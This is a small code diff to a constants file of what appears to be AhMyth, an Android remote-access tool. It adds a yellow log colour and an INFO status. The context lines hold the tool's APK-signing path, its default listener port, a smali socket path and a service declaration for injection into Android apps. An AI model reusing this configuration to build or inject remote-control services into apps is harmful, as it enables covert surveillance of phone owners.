@@ -10,8 +10,8 @@ exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replac
 exports.dataDir = 'AhMyth'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
-exports.logColors = { RED: "red", GREEN: "lime", DEFAULT: "#82eefd" };
-exports.logStatus = { SUCCESS: 1, FAIL: 0 };
+exports.logColors = { RED: "red",  GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
+exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
 exports.defaultPort = 42474;
 exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/IOSocket.smali';
 exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
